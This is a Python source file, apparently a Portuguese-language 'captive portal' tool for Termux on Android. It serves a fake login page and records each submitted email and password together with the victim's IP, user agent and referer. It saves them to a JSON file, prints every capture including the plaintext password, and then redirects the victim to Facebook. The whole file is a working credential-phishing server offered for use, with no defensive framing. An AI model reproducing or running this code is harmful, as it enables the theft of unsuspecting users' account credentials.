#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
import datetime
import json
import os
import sys

# Carregar configurações
def load_config():
    try:
        with open('config.json', 'r') as f:
            return json.load(f)
    except:
        return {
            'redirect_url': 'https://www.facebook.com',
            'port': 8080,
            'credentials_file': 'credentials/captured.json',
            'log_file': 'logs/access.log'
        }

CONFIG = load_config()

class CaptivePortalHandler(BaseHTTPRequestHandler):
    
    def log_message(self, format, *args):
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(CONFIG['log_file'], 'a') as f:
            f.write("{0} - {1} - {2}\n".format(timestamp, self.address_string(), format % args))
    
    def do_GET(self):
        if self.path == '/' or self.path == '/index.html':
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            
            try:
                with open('templates/login.html', 'rb') as f:
                    self.wfile.write(f.read())
            except FileNotFoundError:
                self.wfile.write(b"<h1>Erro: templates/login.html nao encontrado</h1>")
        else:
            self.send_response(302)
            self.send_header('Location', '/')
            self.end_headers()
    
    def do_POST(self):
        if self.path == '/authenticate':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            form_data = urllib.parse.parse_qs(post_data)
            
            email = form_data.get('email', [''])[0]
            password = form_data.get('password', [''])[0]
            
            credential_entry = {
                'timestamp': datetime.datetime.now().isoformat(),
                'email': email,
                'password': password,
                'ip': self.client_address[0],
                'user_agent': self.headers.get('User-Agent', 'Unknown'),
                'referer': self.headers.get('Referer', 'None')
            }
            
            self.save_credentials(credential_entry)
            
            print("\n" + "="*70)
            print("  [NOVA CAPTURA]")
            print("="*70)
            print("  Timestamp: {0}".format(credential_entry['timestamp']))
            print("  Email: {0}".format(email))
            print("  Senha: {0}".format(password))
            print("  IP: {0}".format(credential_entry['ip']))
            print("  Device: {0}".format(credential_entry['user_agent'][:50]))
            print("="*70 + "\n")
            
            self.send_response(302)
            self.send_header('Location', CONFIG['redirect_url'])
            self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()
    
    def save_credentials(self, data):
        credentials = []
        
        if os.path.exists(CONFIG['credentials_file']):
            try:
                with open(CONFIG['credentials_file'], 'r') as f:
                    credentials = json.load(f)
            except:
                credentials = []
        
        credentials.append(data)
        
        os.makedirs(os.path.dirname(CONFIG['credentials_file']), exist_ok=True)
        
        with open(CONFIG['credentials_file'], 'w') as f:
            json.dump(credentials, f, indent=4, ensure_ascii=False)

def print_banner():
    banner = """
    ╔══════════════════════════════════════════════════════════════════╗
    ║                                                                  ║
    ║          CAPTIVE PORTAL PROFISSIONAL v3.0                       ║
    ║          Para Termux Android                                    ║
    ║                                                                  ║
    ╚══════════════════════════════════════════════════════════════════╝
    """
    print(banner)

def get_local_ip():
    """Detectar IP automaticamente"""
    import socket
    try:
        # Cria socket temporário
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def run_server():
    print_banner()
    
    port = CONFIG['port']
    server_address = ('', port)
    
    # Detectar IP local
    local_ip = get_local_ip()
    
    try:
        httpd = HTTPServer(server_address, CaptivePortalHandler)
    except OSError as e:
        if e.errno == 98:
            print("[ERRO] Porta {0} ja esta em uso.".format(port))
            print("Tente: fuser -k {0}/tcp".format(port))
            sys.exit(1)
        raise
    
    print("  [+] Status: ATIVO")
    print("  [+] Porta: {0}".format(port))
    print("  [+] IP Local: {0}".format(local_ip))
    print("  [+] Redirect: {0}".format(CONFIG['redirect_url']))
    print("  [+] Credenciais: {0}".format(CONFIG['credentials_file']))
    print("  [+] Logs: {0}".format(CONFIG['log_file']))
    print("\n  " + "="*66)
    print("  [*] ACESSE O PORTAL VIA:")
    print("  [*] http://{0}:{1}".format(local_ip, port))
    print("  " + "="*66)
    print("\n  [*] Servidor rodando...")
    print("  [*] Pressione Ctrl+C para parar\n")
    
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n\n  [!] Servidor encerrado pelo usuario")
        print("  [!] Total de capturas salvas em: {0}\n".format(CONFIG['credentials_file']))
        sys.exit(0)
